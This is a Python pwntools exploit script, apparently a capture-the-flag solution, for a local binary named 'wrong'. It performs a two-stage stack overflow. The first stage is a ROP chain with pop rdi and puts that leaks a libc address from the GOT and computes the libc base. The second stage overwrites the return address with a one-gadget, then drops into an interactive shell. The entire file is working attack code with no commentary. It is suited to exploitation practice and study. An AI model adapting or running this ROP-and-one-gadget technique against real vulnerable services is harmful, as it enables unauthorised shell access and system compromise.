from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./wrong", env = {"LD_PRELOAD":"./libc.so.6"})
else:
    conn = remote(HOST, PORT)

binary = ELF("./wrong")
libc   = ELF("./libc.so.6")

context.log_level = 'debug'

gdb.attach(conn,
           """
           b*main+154
           c
           """
           )

dummy = raw_input("Press Enter key to enter...")

# 0x00000000000007f3: pop rdi; ret;
pop_rdi = 0x4007f3
MAIN = 0x4006e6

# 1st

print conn.recvline()

ex  = "A"*40
ex += p64(pop_rdi)
ex += p64(binary.got['puts'])
ex += p64(binary.plt['puts'])
ex += p64(MAIN)

conn.sendline(ex)

print conn.recv(len("Nice to meet you ") + 40 + 3)
puts_real = u64(conn.recv(6).ljust(8, '\x00'))

log.info("puts_real = {}".format(hex(puts_real)))

puts_rel = 0x06f690
libc_base = puts_real - puts_rel
log.info("libc_base = {}".format(hex(libc_base)))

onegadget_rel = 0xf0274
onegadget_real = libc_base + onegadget_rel

# 2nd

print conn.recvline()

ex  = "A"*40
ex += p64(onegadget_real)

conn.sendline(ex)

print conn.recv(len("Nice to meet you ") + 40 + 3)


conn.interactive()
